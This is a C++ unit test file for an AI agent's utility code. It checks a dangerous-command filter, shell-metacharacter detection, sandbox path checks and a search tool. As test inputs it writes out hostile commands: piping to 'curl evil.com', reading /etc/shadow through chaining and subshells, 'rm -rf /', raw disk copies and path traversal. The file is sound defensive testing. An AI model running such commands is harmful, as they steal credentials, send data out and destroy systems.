#include <iostream>
#include <cassert>
#include <string>
#include <vector>
#include <fstream>
#include <filesystem>
#include "agent_utils.h"

namespace fs = std::filesystem;

using namespace std;

#define RUN_TEST(name) do {                         \
    std::cout << "Running " << #name << "... ";     \
    try { name(); std::cout << "PASSED\n"; }        \
    catch (const std::exception& e) {               \
      std::cout << "FAILED: " << e.what() << "\n";  \
    }                                               \
  } while(0)

// Backtick character constant to avoid markdown interpretation
static const char BT = '`';
static const string FENCE(3, BT);

//
// hasDangerousPatterns tests
//

static void test_has_dangerous_patterns_basic() {
  vector<string> allowed = {"ls", "cat", "echo"};

  // Safe commands
  assert(hasDangerousPatterns("ls -la", allowed) == false);
  assert(hasDangerousPatterns("cat file.txt", allowed) == false);
  assert(hasDangerousPatterns("echo hello", allowed) == false);

  // Redirects are dangerous
  assert(hasDangerousPatterns("ls > out.txt", allowed) == true);
  assert(hasDangerousPatterns("cat < in.txt", allowed) == true);
  assert(hasDangerousPatterns("echo hi > file", allowed) == true);

  // rm is dangerous
  assert(hasDangerousPatterns("rm file.txt", allowed) == true);
  assert(hasDangerousPatterns("rm -rf /", allowed) == true);

  cout << "test_has_dangerous_patterns_basic passed" << endl;
}

static void test_has_dangerous_patterns_pipe() {
  vector<string> allowed = {"ls", "grep"};

  // Pipe to allowed program is safe
  assert(hasDangerousPatterns("ls | grep foo", allowed) == false);

  // Pipe to disallowed program is dangerous
  assert(hasDangerousPatterns("ls | rm -rf /", allowed) == true);
  assert(hasDangerousPatterns("ls | curl evil.com", allowed) == true);

  // Pipe with no redirect or rm
  assert(hasDangerousPatterns("ls | grep bar", allowed) == false);

  // Multiple pipes - checks last pipe target
  assert(hasDangerousPatterns("ls | grep foo | rm -rf /", allowed) == true);
  assert(hasDangerousPatterns("ls | grep foo | cat", allowed) == true); // cat not in allowed

  cout << "test_has_dangerous_patterns_pipe passed" << endl;
}

static void test_has_dangerous_patterns_edge_cases() {
  vector<string> allowed = {"ls"};

  // Empty command
  assert(hasDangerousPatterns("", allowed) == false);

  // rm without space (should not match "rm ")
  assert(hasDangerousPatterns("rmfile", allowed) == false);

  // rm at start with space
  assert(hasDangerousPatterns("rm -rf /tmp", allowed) == true);

  // Pipe with whitespace after pipe
  assert(hasDangerousPatterns("ls |   grep foo", allowed) == true); // grep not in allowed

  // Pipe to allowed with leading spaces
  vector<string> allowed2 = {"ls", "grep"};
  assert(hasDangerousPatterns("ls |   grep foo", allowed2) == false);

  cout << "test_has_dangerous_patterns_edge_cases passed" << endl;
}

//
// join_path tests
//

static void test_join_path_basic() {
  assert(join_path("/home/user", "file.txt") == "/home/user/file.txt");
  assert(join_path("/home/user/", "file.txt") == "/home/user/file.txt");
  // Absolute second arg: leading '/' stripped, joined to first
  assert(join_path("/home/user", "/file.txt") == "/home/user/file.txt");
  assert(join_path("/home/user", "") == "/home/user");
  assert(join_path("", "file.txt") == "/file.txt");
  assert(join_path("", "/file.txt") == "/file.txt");

  cout << "test_join_path_basic passed" << endl;
}

static void test_join_path_edge_cases() {
  // Both empty
  assert(join_path("", "") == "");

  // Trailing slash on a
  assert(join_path("/a/b/", "c") == "/a/b/c");

  // Leading slash on b (stripped, joined to a)
  assert(join_path("/a/b", "/c/d") == "/a/b/c/d");

  // Multiple slashes in a
  assert(join_path("/a//b", "c") == "/a//b/c");

  // Relative paths
  assert(join_path("src", "main.cpp") == "src/main.cpp");
  assert(join_path("src/", "main.cpp") == "src/main.cpp");

  cout << "test_join_path_edge_cases passed" << endl;
}

//
// unwrap tests
//

static void test_unwrap_quotes() {
  assert(unwrap("\"hello\"") == "hello");
  assert(unwrap("'hello'") == "hello");
  assert(unwrap("|hello|") == "hello");
  assert(unwrap(string(1, BT) + "hello" + string(1, BT)) == "hello");

  // With surrounding whitespace
  assert(unwrap("  \"hello\"  ") == "hello");
  assert(unwrap("  'hello'  ") == "hello");

  cout << "test_unwrap_quotes passed" << endl;
}

static void test_unwrap_mirror_pairs() {
  assert(unwrap("(hello)") == "hello");
  assert(unwrap("[hello]") == "hello");
  assert(unwrap("{hello}") == "hello");

  // With surrounding whitespace
  assert(unwrap("  (hello)  ") == "hello");
  assert(unwrap("  [hello]  ") == "hello");
  assert(unwrap("  {hello}  ") == "hello");

  cout << "test_unwrap_mirror_pairs passed" << endl;
}

static void test_unwrap_html_tags() {
  assert(unwrap("<b>bold</b>") == "bold");
  assert(unwrap("<file>x</file>") == "x");
  assert(unwrap("<div>content</div>") == "content");

  // With surrounding whitespace
  assert(unwrap("  <b>bold</b>  ") == "bold");

  cout << "test_unwrap_html_tags passed" << endl;
}

static void test_unwrap_angle_brackets() {
  // Plain angle brackets (no matching HTML tag)
  assert(unwrap("<hello>") == "hello");
  assert(unwrap("<file.txt>") == "file.txt");

  // With whitespace
  assert(unwrap("  <hello>  ") == "hello");

  cout << "test_unwrap_angle_brackets passed" << endl;
}

static void test_unwrap_no_wrapper() {
  assert(unwrap("plain") == "plain");
  assert(unwrap("hello world") == "hello world");
  assert(unwrap("123") == "123");

  // With surrounding whitespace (just trims)
  assert(unwrap("  hello  ") == "hello");

  cout << "test_unwrap_no_wrapper passed" << endl;
}

static void test_unwrap_edge_cases() {
  // Empty string
  assert(unwrap("") == "");

  // Whitespace only
  assert(unwrap("   ") == "");

  // Single character
  assert(unwrap("a") == "a");

  // Mismatched brackets (should not unwrap)
  assert(unwrap("(hello]") == "(hello]");
  assert(unwrap("[hello)") == "[hello)");

  // Nested (only outermost is unwrapped)
  assert(unwrap("( [hello] )") == " [hello] ");

  // Angle brackets with no closing match
  assert(unwrap("<hello") == "<hello");

  cout << "test_unwrap_edge_cases passed" << endl;
}

//
// strip_code_fences tests
//

static void test_strip_code_fences_code_file() {
  // Code file with fences - should strip them
  string src = FENCE + "cpp\nint main() { return 0; }\n" + FENCE;
  assert(strip_code_fences("test.cpp", src) == "int main() { return 0; }\n");

  // Code file without fences - should return as-is
  string src2 = "int main() { return 0; }";
  assert(strip_code_fences("test.cpp", src2) == "int main() { return 0; }");

  cout << "test_strip_code_fences_code_file passed" << endl;
}

static void test_strip_code_fences_non_code_file() {
  // Non-code file - should use unwrap()
  string src = "\"hello world\"";
  assert(strip_code_fences("readme.md", src) == "hello world");

  // Non-code file with no wrapper
  string src2 = "hello world";
  assert(strip_code_fences("readme.md", src2) == "hello world");

  cout << "test_strip_code_fences_non_code_file passed" << endl;
}

static void test_strip_code_fences_edge_cases() {
  // Code file with fences but no newline after opening fence
  string src = FENCE + "cpp";
  assert(strip_code_fences("test.cpp", src) == FENCE + "cpp");

  // Code file with opening fence but no closing fence
  string src2 = FENCE + "cpp\nint x = 1;\n";
  assert(strip_code_fences("test.cpp", src2) == "int x = 1;\n");

  // Empty string
  assert(strip_code_fences("test.cpp", "") == "");

  // Code file with language tag on fence
  string src3 = FENCE + "python\nprint('hi')\n" + FENCE;
  assert(strip_code_fences("test.py", src3) == "print('hi')\n");

  cout << "test_strip_code_fences_edge_cases passed" << endl;
}

//
// Extended hasDangerousPatterns tests (P1-1 security fix)
//

static void test_has_dangerous_patterns_extended() {
  vector<string> allowed = {"g++", "ls", "cat"};

  // Command chaining
  assert(hasDangerousPatterns("cat /etc/shadow && curl evil.com", allowed) == true);
  assert(hasDangerousPatterns("ls; cat /etc/shadow", allowed) == true);

  // Backtick substitution
  assert(hasDangerousPatterns(string("echo ") + BT + "cat /etc/shadow" + BT, allowed) == true);

  // Subshell
  assert(hasDangerousPatterns("echo $(cat /etc/shadow)", allowed) == true);

  // File manipulation commands
  assert(hasDangerousPatterns("cp /etc/shadow /tmp/x", allowed) == true);
  assert(hasDangerousPatterns("mv /etc/shadow /tmp/x", allowed) == true);
  assert(hasDangerousPatterns("dd if=/dev/sda of=/tmp/x", allowed) == true);
  assert(hasDangerousPatterns("chmod 777 /etc/passwd", allowed) == true);
  assert(hasDangerousPatterns("chown root:root /etc/passwd", allowed) == true);

  // Safe commands still pass
  assert(hasDangerousPatterns("g++ -o main main.cpp", allowed) == false);
  assert(hasDangerousPatterns("ls -la src/", allowed) == false);

  cout << "test_has_dangerous_patterns_extended passed" << endl;
}

//
// join_path absolute override test (P2-2)
//

static void test_join_path_absolute_override() {
  // Absolute second argument: leading '/' stripped, joined to sandbox
  assert(join_path("/sandbox", "/etc/passwd") == "/sandbox/etc/passwd");
  // Relative second argument joins normally
  assert(join_path("/sandbox", "src/main.cpp") == "/sandbox/src/main.cpp");

  cout << "test_join_path_absolute_override passed" << endl;
}

//
// resolve_path tests (P0 sandbox checks)
//

static void test_resolve_path() {
  const string sandbox = "/tmp/hali_test_sandbox";

  // Empty or dot returns sandbox
  assert(resolve_path(sandbox, "") == sandbox);
  assert(resolve_path(sandbox, ".") == sandbox);

  // Relative path joins to sandbox
  assert(resolve_path(sandbox, "src/main.cpp") == sandbox + "/src/main.cpp");

  // ./ prefix
  assert(resolve_path(sandbox, "./src/main.cpp") == sandbox + "/src/main.cpp");

  // Absolute path passes through
  assert(resolve_path(sandbox, "/etc/passwd") == "/etc/passwd");

  cout << "test_resolve_path passed" << endl;
}

//
// path_in_sandbox tests (P0 sandbox checks)
//
// Requires a real directory on disk because fs::canonical is used.
//

static void test_path_in_sandbox() {
  const string sandbox = "/tmp/hali_test_sandbox";
  fs::create_directories(sandbox + "/src");

  // Path inside sandbox
  assert(path_in_sandbox(sandbox, sandbox) == true);
  assert(path_in_sandbox(sandbox, sandbox + "/src") == true);
  assert(path_in_sandbox(sandbox, sandbox + "/src/main.cpp") == true);

  // Path outside sandbox
  assert(path_in_sandbox(sandbox, "/etc/passwd") == false);
  assert(path_in_sandbox(sandbox, "/tmp/other_dir") == false);

  // Traversal escape (resolves to outside)
  assert(path_in_sandbox(sandbox, sandbox + "/../../etc/passwd") == false);

  // Clean up
  fs::remove_all(sandbox);

  cout << "test_path_in_sandbox passed" << endl;
}

//
// TOOL:SEARCH tests (P1-3)
//

static void test_search_flags() {
  SearchFlags f = parse_search_flags("--recursive --line-numbers --context=3");
  assert(f.recursive == true);
  assert(f.line_numbers == true);
  assert(f.context == 3);

  SearchFlags f2 = parse_search_flags("--count");
  assert(f2.count == true);
  assert(f2.recursive == false);

  SearchFlags f3 = parse_search_flags("--line-count");
  assert(f3.line_count == true);

  SearchFlags f4 = parse_search_flags("--files-only");
  assert(f4.files_only == true);

  SearchFlags f5 = parse_search_flags("--include=*.cpp");
  assert(f5.include_glob == "*.cpp");

  SearchFlags f6 = parse_search_flags("");
  assert(f6.recursive == false);
  assert(f6.count == false);

  cout << "test_search_flags passed" << endl;
}

static void test_has_shell_metachars() {
  assert(has_shell_metachars("foo; rm -rf /") == true);
  assert(has_shell_metachars("foo | grep bar") == true);
  assert(has_shell_metachars("foo && bar") == true);
  assert(has_shell_metachars(string("echo ") + BT + "cmd" + BT) == true);
  assert(has_shell_metachars("echo $(cmd)") == true);
  assert(has_shell_metachars("foo > out.txt") == true);
  assert(has_shell_metachars("foo < in.txt") == true);

  // Safe patterns
  assert(has_shell_metachars("int main") == false);
  assert(has_shell_metachars("hello world") == false);
  assert(has_shell_metachars("") == false);

  cout << "test_has_shell_metachars passed" << endl;
}

static void test_search_single_file() {
  const string test_file = "/tmp/hali_test_search.txt";
  {
    ofstream out(test_file);
    out << "line one\n";
    out << "int main() { return 0; }\n";
    out << "line three\n";
    out << "another int main here\n";
  }

  SearchFlags f;
  f.line_numbers = true;

  string result = search_single_file(test_file, "int main", f);
  assert(result.find("int main() { return 0; }") != string::npos);
  assert(result.find("another int main here") != string::npos);

  // Count mode
  SearchFlags fc;
  fc.count = true;
  string count_result = search_single_file(test_file, "int main", fc);
  assert(count_result == "2");

  // Line count mode
  SearchFlags flc;
  flc.line_count = true;
  string lc_result = search_single_file(test_file, "", flc);
  assert(lc_result == "4");

  // No match
  string no_match = search_single_file(test_file, "nonexistent_pattern_xyz", f);
  assert(no_match.empty());

  // Clean up
  remove(test_file.c_str());

  cout << "test_search_single_file passed" << endl;
}

static void test_search_lines_flag() {
  const string test_file = "/tmp/hali_test_lines.txt";
  {
    ofstream out(test_file);
    out << "alpha\n";
    out << "beta\n";
    out << "gamma\n";
    out << "delta\n";
    out << "epsilon\n";
    out << "zeta\n";
  }

  // Parse: --lines=2,4
  SearchFlags f = parse_search_flags("--lines=2,4");
  assert(f.lines_start == 2);
  assert(f.lines_end == 4);

  // Parse: --lines=5 (single line)
  SearchFlags f2 = parse_search_flags("--lines=5");
  assert(f2.lines_start == 5);
  assert(f2.lines_end == 5);

  // Parse: no --lines
  SearchFlags f3 = parse_search_flags("--recursive");
  assert(f3.lines_start == 0);
  assert(f3.lines_end == 0);

  // sed-like: empty pattern + --lines=2,4 → returns lines 2-4
  SearchFlags sed;
  sed.lines_start = 2;
  sed.lines_end = 4;
  string result = search_single_file(test_file, "", sed);
  assert(result == "beta\ngamma\ndelta\n");

  // sed-like with line numbers
  SearchFlags sed_ln;
  sed_ln.lines_start = 2;
  sed_ln.lines_end = 4;
  sed_ln.line_numbers = true;
  string result_ln = search_single_file(test_file, "", sed_ln);
  assert(result_ln == "2:beta\n3:gamma\n4:delta\n");

  // Pattern search restricted to range: "a" in lines 1-3
  SearchFlags pat;
  pat.lines_start = 1;
  pat.lines_end = 3;
  string pat_result = search_single_file(test_file, "a", pat);
  // "alpha" (line 1) and "gamma" (line 3) contain 'a'
  assert(pat_result.find("alpha") != string::npos);
  assert(pat_result.find("gamma") != string::npos);
  // "delta" (line 4) is outside range
  assert(pat_result.find("delta") == string::npos);

  // Single line: --lines=3
  SearchFlags single;
  single.lines_start = 3;
  single.lines_end = 3;
  string single_result = search_single_file(test_file, "", single);
  assert(single_result == "gamma\n");

  // Out of range: --lines=10,12 on a 6-line file
  SearchFlags oor;
  oor.lines_start = 10;
  oor.lines_end = 12;
  string oor_result = search_single_file(test_file, "", oor);
  assert(oor_result.empty());

  // X > Y: --lines=5,2
  SearchFlags inv;
  inv.lines_start = 5;
  inv.lines_end = 2;
  string inv_result = search_single_file(test_file, "", inv);
  assert(inv_result.empty());

  // Range extends beyond file: --lines=5,100
  SearchFlags ext;
  ext.lines_start = 5;
  ext.lines_end = 100;
  string ext_result = search_single_file(test_file, "", ext);
  assert(ext_result == "epsilon\nzeta\n");

  // Count mode with range: "a" in lines 1-3 (alpha, beta, gamma all contain 'a')
  SearchFlags cnt;
  cnt.lines_start = 1;
  cnt.lines_end = 3;
  cnt.count = true;
  string cnt_result = search_single_file(test_file, "a", cnt);
  assert(cnt_result == "3");

  // Clean up
  remove(test_file.c_str());

  cout << "test_search_lines_flag passed" << endl;
}

static void test_tool_search() {
  const string sandbox = "/tmp/hali_test_search_sandbox";
  fs::create_directories(sandbox + "/src");

  // Create test files
  {
    ofstream out(sandbox + "/src/main.cpp");
    out << "int main() { return 0; }\n";
    out << "// TODO: add error handling\n";
  }
  {
    ofstream out(sandbox + "/src/util.cpp");
    out << "// TODO: refactor this\n";
    out << "int helper() { return 1; }\n";
  }

  // Basic search in a single file
  string result = tool_search(sandbox, "int main", "src/main.cpp", "");
  assert(result.find("int main() { return 0; }") != string::npos);

  // Recursive search
  string rec_result = tool_search(sandbox, "TODO", "src/", "--recursive");
  assert(rec_result.find("add error handling") != string::npos);
  assert(rec_result.find("refactor this") != string::npos);

  // Files only
  string fo_result = tool_search(sandbox, "TODO", "src/", "--recursive --files-only");
  assert(fo_result.find("main.cpp") != string::npos);
  assert(fo_result.find("util.cpp") != string::npos);

  // Outside sandbox
  string outside = tool_search(sandbox, "foo", "/etc/", "");
  assert(outside.find("ERROR") != string::npos);

  // Traversal escape
  string traversal = tool_search(sandbox, "foo", "../../etc/", "");
  assert(traversal.find("ERROR") != string::npos);

  // Shell metacharacters in pattern
  string metachars = tool_search(sandbox, "foo; rm -rf /", "src/main.cpp", "");
  assert(metachars.find("ERROR") != string::npos);

  // Clean up
  fs::remove_all(sandbox);

  cout << "test_tool_search passed" << endl;
}

//
// Top-level test entry point
//

void agent_utils_test() {
  cout << "=== Running agent_utils Unit Tests ===\n\n";

  RUN_TEST(test_has_dangerous_patterns_basic);
  RUN_TEST(test_has_dangerous_patterns_pipe);
  RUN_TEST(test_has_dangerous_patterns_edge_cases);
  RUN_TEST(test_has_dangerous_patterns_extended);
  RUN_TEST(test_join_path_basic);
  RUN_TEST(test_join_path_edge_cases);
  RUN_TEST(test_join_path_absolute_override);
  RUN_TEST(test_resolve_path);
  RUN_TEST(test_path_in_sandbox);
  RUN_TEST(test_unwrap_quotes);
  RUN_TEST(test_unwrap_mirror_pairs);
  RUN_TEST(test_unwrap_html_tags);
  RUN_TEST(test_unwrap_angle_brackets);
  RUN_TEST(test_unwrap_no_wrapper);
  RUN_TEST(test_unwrap_edge_cases);
  RUN_TEST(test_strip_code_fences_code_file);
  RUN_TEST(test_strip_code_fences_non_code_file);
  RUN_TEST(test_strip_code_fences_edge_cases);
  RUN_TEST(test_search_flags);
  RUN_TEST(test_has_shell_metachars);
  RUN_TEST(test_search_single_file);
  RUN_TEST(test_search_lines_flag);
  RUN_TEST(test_tool_search);

  cout << "\n=== All agent_utils tests completed ===\n";
}

